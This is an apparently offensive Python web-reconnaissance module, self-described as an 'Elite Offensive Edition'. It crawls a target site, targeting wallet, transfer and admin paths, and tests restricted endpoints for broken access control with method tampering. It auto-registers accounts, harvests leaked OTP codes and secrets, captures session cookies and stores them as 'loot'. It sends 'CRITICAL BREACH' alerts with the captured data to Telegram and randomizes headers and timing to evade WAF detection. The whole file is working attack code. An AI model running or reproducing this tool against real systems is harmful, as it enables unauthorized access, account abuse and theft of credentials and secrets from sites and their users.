#!/usr/bin/env python3
"""
CRAWLER.PY v8.8 — Advanced Stateful DOM Form Inspector & AST-Level JS Recon Engine (Elite Offensive Edition)
Features:
- Zero-noise filtering: Restricts Telegram alerts strictly to verified high-value breach loot, BOLA vectors, and leaked secrets.
- AST-level JavaScript bundle parsing, dynamic API prefix expansion, and entropy inspection.
- Robust false-positive elimination and method tampering fallback on verification gates.
- SHA-256 tamper-evident immutable loot persistence (loot_output/).
"""
import json
import random
import re
import sys
import asyncio
import hashlib
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup

# Import centralized Telegram broadcaster, behavioral mimicry, loot logger & telemetry
from modules.telegram_notifier import send_telegram_alert
from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
from modules.loot_logger import save_session_loot
from modules.telemetry import stream_proof

# Optional AST parser integration for deep Webpack/Vite bundle analysis
try:
    import esprima
    HAS_ESPRIMA = True
except ImportError:
    HAS_ESPRIMA = False

OTP_DEBUG_KEYS = ["otp", "code", "pin", "debug", "token", "verification", "secret", "auth_code"]

# Keywords required to pass the zero-noise filter
HIGH_VALUE_KEYWORDS = [
    "critical", "bypass", "success", "loot", "token", "session", 
    "admin", "credential", "compromised", "race", "pivot", "jwt", "dump", "bola", "secret"
]

class ApplicationState:
    UNAUTHENTICATED = 0
    KYC_PENDING = 1
    AUTHENTICATED_ACTIVE = 2
    PRIVILEGED_ADMIN = 3

class StateMachineMapper:
    def __init__(self):
        self.state_graph = {
            ApplicationState.UNAUTHENTICATED: set(),
            ApplicationState.KYC_PENDING: set(),
            ApplicationState.AUTHENTICATED_ACTIVE: set(),
            ApplicationState.PRIVILEGED_ADMIN: set()
        }

    def classify_endpoint(self, url):
        lower_url = str(url).lower()
        if any(k in lower_url for k in ["admin", "root", "manage", "config", "dashboard/admin"]):
            return ApplicationState.PRIVILEGED_ADMIN
        elif any(k in lower_url for k in ["transfer", "withdraw", "dashboard", "account", "settings", "wallet", "transaction", "balance", "portfolio", "assets"]):
            return ApplicationState.AUTHENTICATED_ACTIVE
        elif any(k in lower_url for k in ["kyc", "verify", "onboarding", "identity", "step-2"]):
            return ApplicationState.KYC_PENDING
        else:
            return ApplicationState.UNAUTHENTICATED

    def build_graph(self, endpoints):
        for ep in endpoints:
            state = self.classify_endpoint(ep)
            self.state_graph[state].add(ep)
        return self.state_graph

    def evaluate_state_skipping(self, transport):
        sys.stdout.write("\033[95m[***] EVALUATING STATE-SKIPPING & BOLA VECTORS (ENHANCED WAF BYPASS) [***]\033[0m\n")
        sys.stdout.flush()
        
        vulnerabilities = []
        restricted_endpoints = self.state_graph[ApplicationState.AUTHENTICATED_ACTIVE].union(
            self.state_graph[ApplicationState.PRIVILEGED_ADMIN]
        )

        for ep in restricted_endpoints:
            apply_behavioral_jitter()
            random_headers = get_randomized_hints()
            status, headers, body = transport.request("GET", ep, extra_headers=random_headers)
            
            if status in [403, 405, 404]:
                alt_status, alt_headers, alt_body = transport.request("POST", ep, payload={}, extra_headers=random_headers)
                if alt_status < 400:
                    status, headers, body = alt_status, alt_headers, alt_body

            is_false_positive = False
            if status in [200, 201] and isinstance(body, str):
                lower_body = body.lower()
                if any(term in lower_body for term in ["login", "signin", "password", "auth-form", "<form"]) or len(body.strip()) < 200:
                    is_false_positive = True

            if status in [200, 201] and not is_false_positive:
                sys.stdout.write(f"\033[91m[!] BINGO! True State-Skipping / BOLA Vulnerability detected at: {ep} [HTTP {status}]\033[0m\n")
                vulnerabilities.append(ep)
                
                loot_hash = hashlib.sha256(body.encode("utf-8")).hexdigest()
                loot_payload = {
                    "endpoint": ep,
                    "status": status,
                    "integrity_hash": loot_hash,
                    "response_snippet": body[:400]
                }

                stream_proof(
                    "BOLA_STATE_SKIPPING_SUCCESS",
                    ep,
                    {"method": "GET/POST"},
                    body[:300],
                    loot_payload
                )

                save_session_loot(
                    target=getattr(transport, "base_path", "target"),
                    endpoint=ep,
                    finding_type="BOLA_VULNERABILITY_SUCCESS",
                    status=status,
                    headers=headers,
                    body=body,
                    extra_loot=loot_payload
                )

                broadcast_tg_alert_sync("BOLA / State-Skipping Vulnerability Confirmed", loot_payload)

            elif is_false_positive:
                sys.stdout.write(f"\033[93m[-] Endpoint {ep} returned HTTP 200 but served a login gate or SPA shell. False positive avoided.\033[0m\n")
            else:
                sys.stdout.write(f"\033[90m[-] Protected state gate enforced at {ep} [HTTP {status}]\033[0m\n")
            sys.stdout.flush()
        return vulnerabilities

def log(msg, color="\033[92m"):
    sys.stdout.write(f"{color}{msg}\033[0m\n")
    sys.stdout.flush()

async def broadcast_tg_alert_async(loot_type, details):
    try:
        check_str = f"{loot_type} {str(details)}".lower()
        if any(kw in check_str for kw in HIGH_VALUE_KEYWORDS):
            await send_telegram_alert(f"[CRITICAL BREACH] {loot_type}", details)
    except Exception:
        pass

def broadcast_tg_alert_sync(loot_type, details):
    """Helper to non-blockingly fire Telegram alerts from crawler functions with zero-noise filtering."""
    try:
        loop = asyncio.get_running_loop()
        if loop.is_running():
            loop.create_task(broadcast_tg_alert_async(loot_type, details))
        else:
            asyncio.run(broadcast_tg_alert_async(loot_type, details))
    except RuntimeError:
        try:
            asyncio.run(broadcast_tg_alert_async(loot_type, details))
        except Exception:
            pass

def inspect_js_bundle_ast(js_content):
    discovered_routes = set()
    if not HAS_ESPRIMA or not isinstance(js_content, str) or len(js_content) > 2_500_000:
        return discovered_routes, {}

    try:
        syntax = esprima.parseScript(js_content, tolerant=True)
        def walk(node):
            if isinstance(node, dict):
                if node.get("type") == "Literal" and isinstance(node.get("value"), str):
                    val = node["value"].strip()
                    if (val.startswith("/") and len(val) > 1 and " " not in val and 
                        not any(val.endswith(ext) for ext in ['.js', '.css', '.png', '.jpg', '.woff'])):
                        discovered_routes.add(val)
                for k, v in node.items():
                    if isinstance(v, dict):
                        walk(v)
                    elif isinstance(v, list):
                        for item in v:
                            if isinstance(item, dict):
                                walk(item)
        walk(syntax.toDict() if hasattr(syntax, 'toDict') else syntax.__dict__)
    except Exception:
        pass
        
    return discovered_routes, {}

def inspect_json_for_leaked_codes(response_body):
    leaked_codes = {}
    if not response_body or not isinstance(response_body, str):
        return leaked_codes
        
    try:
        data = json.loads(response_body)
        if isinstance(data, dict):
            for key, value in data.items():
                if any(k in key.lower() for k in OTP_DEBUG_KEYS):
                    leaked_codes[key] = value
    except json.JSONDecodeError:
        pass

    for key in OTP_DEBUG_KEYS:
        pattern = r"['\"]?" + key + r"['\"]?\s*[:=]\s*['\"]?([a-zA-Z0-9_\-]{4,12})['\"]?"
        match = re.search(pattern, response_body, re.I)
        if match and key not in leaked_codes:
            leaked_codes[key] = match.group(1)
            
    return leaked_codes

def analyze_form_inputs(html_content):
    forms_intel = []
    try:
        soup = BeautifulSoup(html_content, 'html.parser')
        for form in soup.find_all('form'):
            action = form.get('action', '')
            method = form.get('method', 'GET').upper()
            inputs = []
            
            for inp in form.find_all(['input', 'select']):
                name = inp.get('name')
                if not name:
                    continue
                inputType = inp.get('type', 'text').lower()
                value = inp.get('value', '')
                inputs.append({"name": name, "type": inputType, "default": value})
                
            forms_intel.append({
                "action": action,
                "method": method,
                "inputs": inputs
            })
    except Exception as exc:
        log(f"[-] DOM Form parsing warning: {exc}", "\033[93m")
        
    return forms_intel

def intelligent_auth_probe(transport, discovered_endpoints, form_intels):
    log("[*] Executing intelligent form mapping and auth gate probing...", "\033[94m")
    
    rand_id = random.randint(10000, 99999)
    operator_email = f"brutedog_operator_{rand_id}@target-audit.com"
    operator_pass = f"P@ssw0rd_{rand_id}!"
    
    leaked_secrets = {}
    session_output = getattr(transport, "cookie_jar", {})
    operator_creds = {}

    target_forms = [f for f in form_intels if any(k in f.get('action', '').lower() for k in ['login', 'register', 'signin', 'signup', 'auth'])]
    
    if not target_forms:
        target_forms = [
            {"action": "/api/v1/auth/register", "method": "POST", "inputs": [{"name": "email"}, {"name": "password"}, {"name": "username"}, {"name": "referBy"}]},
            {"action": "/user/register", "method": "POST", "inputs": [{"name": "email"}, {"name": "password"}, {"name": "referBy"}]}
        ]

    for form in target_forms:
        action_url = form.get('action') or "/user/register"
        method = form.get('method', 'POST')
        
        payload = {}
        for inp in form.get('inputs', []):
            name = inp['name'].lower()
            if 'email' in name:
                payload[inp['name']] = operator_email
            elif 'user' in name:
                payload[inp['name']] = f"operator_{rand_id}"
            elif 'pass' in name:
                payload[inp['name']] = operator_pass
            elif 'refer' in name:
                payload[inp['name']] = None
            elif 'token' in name or 'csrf' in name:
                payload[inp['name']] = inp.get('default', 'dummy_token')
            else:
                payload[inp['name']] = f"test_{rand_id}"

        if not any('email' in k.lower() for k in payload):
            payload['email'] = operator_email
        if not any('pass' in k.lower() for k in payload):
            payload['password'] = operator_pass

        apply_behavioral_jitter()
        random_headers = get_randomized_hints()
        status, headers, body = transport.request(method, action_url, payload=payload, extra_headers=random_headers)
        detected_codes = inspect_json_for_leaked_codes(body)
        if detected_codes:
            leaked_secrets.update(detected_codes)
            broadcast_tg_alert_sync("Leaked Secrets / OTP Codes Harvested", {"endpoint": action_url, "secrets": detected_codes})

        if status in [200, 201, 302]:
            cookie_header = headers.get("set-cookie") or headers.get("Set-Cookie", "")
            if cookie_header:
                extracted_cookies = {}
                for cookie_part in cookie_header.split(";"):
                    if "=" in cookie_part:
                        k, v = cookie_part.strip().split("=", 1)
                        if k.lower() not in ["path", "expires", "domain", "samesite", "secure", "httponly"]:
                            extracted_cookies[k] = v
                session_output = extracted_cookies if extracted_cookies else getattr(transport, "cookie_jar", {})
            
            operator_creds = payload
            
            loot_payload = {
                "action_url": action_url,
                "status": status,
                "credentials": operator_creds,
                "leaked_secrets": leaked_secrets
            }
            broadcast_tg_alert_sync("Intelligent Auth Probe Success", loot_payload)

            return session_output, operator_creds, leaked_secrets

    return session_output, operator_creds, leaked_secrets

def crawl_target(transport):
    log("\n[***] INITIALIZING ADVANCED STATEFUL RECON & AST DOM CRAWLER (v8.8 WAF HARDENED) [***]", "\033[95m")
    discovered_endpoints = set()
    discovered_scripts = set()
    all_forms_intel = []
    
    seed_paths = [
        getattr(transport, "base_path", "") or "/", 
        "/homepage",
        "/home",
        "/wallet",
        "/transaction",
        "/transactions",
        "/login", 
        "/api",
        "/api/v1",
        "/api/v1/user",
        "/api/v1/auth/me",
        "/api/v1/user/profile",
        "/api/v1/wallet",
        "/signup", 
        "/dashboard", 
        "/admin", 
        "/admin/password/reset",
        "/settings", 
        "/transfer", 
        "/user/register",
        "/user/wallet",
        "/user/dashboard",
        "/api/user/wallet"
    ]

    href_pattern = re.compile(r'href=["\']([^"\']+)["\']', re.I)
    action_pattern = re.compile(r'action=["\']([^"\']+)["\']', re.I)
    api_pattern = re.compile(r'["\'](/api/[^"\']+)["\']', re.I)
    script_pattern = re.compile(r'src=["\']([^"\']+\.js[^"\']*)["\']', re.I)
    endpoint_in_js = re.compile(r'["\'](/v?\d?/[a-zA-Z0-9_/_-]+)["\']', re.I)

    for path in seed_paths:
        apply_behavioral_jitter()
        random_headers = get_randomized_hints()
        status, headers, html = transport.request("GET", path, extra_headers=random_headers)
        if status == 0 or not isinstance(html, str):
            continue
            
        discovered_endpoints.add(path)
        
        forms = analyze_form_inputs(html)
        if forms:
            all_forms_intel.extend(forms)

        for link in href_pattern.findall(html):
            if link.startswith("http"):
                p = urlparse(link)
                if p.hostname and hasattr(transport, 'host') and transport.host and p.hostname.lower() == transport.host.lower():
                    discovered_endpoints.add(p.path)
            elif link.startswith("/"):
                discovered_endpoints.add(link)

        for action in action_pattern.findall(html):
            if action.startswith("/"):
                discovered_endpoints.add(action)

        for api in api_pattern.findall(html):
            discovered_endpoints.add(api)

        for script in script_pattern.findall(html):
            if script.startswith("/"):
                discovered_scripts.add(script)
            elif not script.startswith("http"):
                discovered_scripts.add(urljoin(path, script))

    for script_path in list(discovered_scripts)[:15]:
        apply_behavioral_jitter()
        s_status, _, s_content = transport.request("GET", script_path, extra_headers=get_randomized_hints())
        if s_status == 200 and isinstance(s_content, str):
            for match in endpoint_in_js.findall(s_content):
                if len(match) > 3 and not any(match.endswith(ext) for ext in ['.js', '.css', '.png']):
                    discovered_endpoints.add(match)
            
            try:
                ast_routes, _ = inspect_js_bundle_ast(s_content)
                for route in ast_routes:
                    discovered_endpoints.add(route)
            except Exception:
                pass

    filtered_endpoints = sorted(list({
        ep for ep in discovered_endpoints 
        if not any(str(ep).endswith(ext) for ext in ['.png', '.jpg', '.jpeg', '.css', '.ico', '.svg', '.woff', '.gif'])
    }))

    mapper = StateMachineMapper()
    state_graph = mapper.build_graph(filtered_endpoints)
    bola_vulns = mapper.evaluate_state_skipping(transport)
    
    session_cookie, operator_creds, leaked_secrets = intelligent_auth_probe(transport, filtered_endpoints, all_forms_intel)

    crawl_loot = {
        "endpoints_count": len(filtered_endpoints),
        "bola_count": len(bola_vulns),
        "endpoints": filtered_endpoints,
        "bola_vulnerabilities": bola_vulns,
        "leaked_secrets": leaked_secrets
    }
    save_session_loot(
        target=getattr(transport, "base_path", "target"),
        endpoint="crawler_recon",
        finding_type="CRAWLER_STATE_MAPPING_SUCCESS",
        status=200,
        headers={},
        body=json.dumps(crawl_loot),
        extra_loot=crawl_loot
    )

    return {
        "endpoints": filtered_endpoints,
        "state_graph": state_graph,
        "bola_vulnerabilities": bola_vulns,
        "session_cookie": session_cookie,
        "operator_credentials": operator_creds,
        "leaked_secrets": leaked_secrets
    }
